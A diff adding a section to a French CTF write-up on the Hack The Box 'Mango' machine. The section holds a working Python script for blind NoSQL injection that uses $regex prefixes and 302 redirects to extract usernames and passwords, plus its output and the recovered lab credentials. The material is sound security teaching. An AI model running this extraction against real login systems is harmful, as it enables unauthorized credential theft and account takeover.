@@ -1,4 +1,5 @@
 ---
+
 # === Archetype writeups – v1 (stable) ===
 # === Archetype: writeups (Page Bundle) ===
 # Copié vers content/writeups/<nom_ctf>/index.md
@@ -840,7 +841,197 @@ Cette méthode fonctionne manuellement, mais devient rapidement fastidieuse. Il 
 
 #### Script
 
+Tu peux automatiser la recherche avec un petit script Python. Celui-ci doit reproduire exactement le principe observé précédemment :
+
+- envoyer une requête avec un préfixe testé par `$regex` ;
+- considérer une réponse `302` comme une correspondance ;
+- conserver le caractère trouvé ;
+- poursuivre avec le caractère suivant.
+
+Le script commence par rechercher les noms d’utilisateur, puis utilise chaque nom découvert pour extraire son mot de passe.
+
+```python
+import re
+import requests
+import string
+
+url = "http://staging-order.mango.htb/"
+
+characters = string.ascii_letters + string.digits + string.punctuation
+
+
+def valid(data):
+    response = requests.post(
+        url,
+        data=data,
+        allow_redirects=False
+    )
+
+    return response.status_code == 302
+
+
+def extract_username(first_character):
+    username = first_character
+
+    while True:
+        found = False
+
+        for character in characters:
+            candidate = username + character
+            regex_candidate = re.escape(candidate)
+
+            data = {
+                "username[$regex]": f"^{regex_candidate}",
+                "password[$regex]": ".*",
+                "login": "login"
+            }
+
+            if valid(data):
+                username = candidate
+                print(f"[+] Username: {username}")
+                found = True
+                break
+
+        if not found:
+            return username
+
+
+def extract_password(username):
+    password = ""
+
+    while True:
+        found = False
+
+        for character in characters:
+            candidate = password + character
+            regex_candidate = re.escape(candidate)
+
+            data = {
+                "username": username,
+                "password[$regex]": f"^{regex_candidate}",
+                "login": "login"
+            }
+
+            if valid(data):
+                password = candidate
+                print(f"[+] {username} password: {password}")
+                found = True
+                break
+
+        if not found:
+            return password
+
+
+users = []
+
+for character in characters:
+    regex_character = re.escape(character)
+
+    data = {
+        "username[$regex]": f"^{regex_character}",
+        "password[$regex]": ".*",
+        "login": "login"
+    }
+
+    if valid(data):
+        username = extract_username(character)
+
+        if username not in users:
+            users.append(username)
+
+for username in users:
+    password = extract_password(username)
+    print(f"[+] {username}:{password}")
+```
+
+La fonction `valid()` envoie la requête sans suivre automatiquement les redirections. Une réponse `302` peut ainsi être utilisée directement comme indicateur qu’un préfixe correspond.
+
+La liste `characters` contient les lettres, les chiffres et les caractères de ponctuation. Certains de ces caractères, comme `.`, `*`, `?`, `[` ou `]`, ont toutefois une signification particulière dans une expression régulière.
+
+Pour éviter qu’ils soient interprétés comme des opérateurs regex, le script utilise :
+
+```
+re.escape()
+```
+
+Par exemple, un point `.` sera ainsi recherché comme un véritable point et non comme le caractère spécial regex signifiant « n’importe quel caractère ».
+
+La première boucle teste les différents caractères possibles au début de `username`. Lorsqu’un caractère provoque une réponse `302`, `extract_username()` poursuit la recherche caractère par caractère jusqu’à ce qu’aucun caractère supplémentaire ne corresponde.
+
+Le même principe est ensuite appliqué par `extract_password()`, cette fois en conservant le nom d’utilisateur trouvé et en faisant varier le préfixe du mot de passe.
+
+Le script affiche progressivement les caractères découverts, ce qui permet de suivre l’extraction pendant son exécution.
+
 #### Résultats
+
+```bash
+python3 nosqli_extract.py
+```
+
+tu donne :
+
+```bash
+[+] Username: ad
+[+] Username: adm
+[+] Username: admi
+[+] Username: admin
+[+] Username: ma
+[+] Username: man
+[+] Username: mang
+[+] Username: mango
+[+] admin password: t
+[+] admin password: t9
+[+] admin password: t9K
+[+] admin password: t9Kc
+[+] admin password: t9KcS
+[+] admin password: t9KcS3
+[+] admin password: t9KcS3>
+[+] admin password: t9KcS3>!
+[+] admin password: t9KcS3>!0
+[+] admin password: t9KcS3>!0B
+[+] admin password: t9KcS3>!0B#
+[+] admin password: t9KcS3>!0B#2
+[+] admin:t9KcS3>!0B#2
+[+] mango password: h
+[+] mango password: h3
+[+] mango password: h3m
+[+] mango password: h3mX
+[+] mango password: h3mXK
+[+] mango password: h3mXK8
+[+] mango password: h3mXK8R
+[+] mango password: h3mXK8Rh
+[+] mango password: h3mXK8RhU
+[+] mango password: h3mXK8RhU~
+[+] mango password: h3mXK8RhU~f
+[+] mango password: h3mXK8RhU~f{
+[+] mango password: h3mXK8RhU~f{]
+[+] mango password: h3mXK8RhU~f{]f
+[+] mango password: h3mXK8RhU~f{]f5
+[+] mango password: h3mXK8RhU~f{]f5H
+[+] mango:h3mXK8RhU~f{]f5H
+```
+
+L’exécution du script t’a permis d’identifier progressivement deux noms d’utilisateur :
+
+```text
+admin
+mango
+```
+
+Le script a ensuite extrait le mot de passe associé à chacun d’eux, caractère par caractère.
+
+Les identifiants obtenus sont :
+
+```
+admin:t9KcS3>!0B#2
+mango:h3mXK8RhU~f{]f5H
+```
+
+
+
+Tu confirmes ainsi que la vulnérabilité NoSQL permet non seulement de contourner le formulaire d’authentification, mais également de récupérer les identifiants stockés par l’application.
+
+Ces comptes peuvent maintenant être testés sur les autres services exposés par la machine, notamment SSH sur le port `22`.
 
 ### Connexion SSH
 
